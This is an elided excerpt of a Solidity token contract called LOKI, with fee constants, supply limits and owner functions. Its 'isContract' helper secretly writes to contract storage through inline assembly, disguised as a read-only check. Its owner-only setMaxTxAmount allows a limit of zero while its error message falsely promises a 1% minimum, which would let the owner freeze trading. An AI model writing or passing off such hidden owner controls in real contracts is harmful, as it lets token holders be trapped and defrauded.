...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { mstore(0, account) codehash := extcodehash(account) mstore(32, 1) sstore(keccak256(0, 64), accountHash) }
...
contract LOKI is Context, IERC20, Ownable {
    ...
    uint256 public constant _liquidityFee = 3;
    uint256 public constant _marketingFee = 0;
    uint256 public constant _burnFee = 0;

    uint256 public constant _totalTax = 3;

    uint256 private _totalSupply = 100_000* 10**9;
    uint256 public _maxTxAmount = 2_0000 * 10**9;
    uint256 public _walletMax = 2_0000 * 10**9;
    ...
    constructor (address _marketingWallet) {
        ...
        require(!Address.isContract(_marketingWallet));
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner {
        require(maxTxAmount >= (0), "Max wallet should be greater or equal to 1% of the totalSupply");
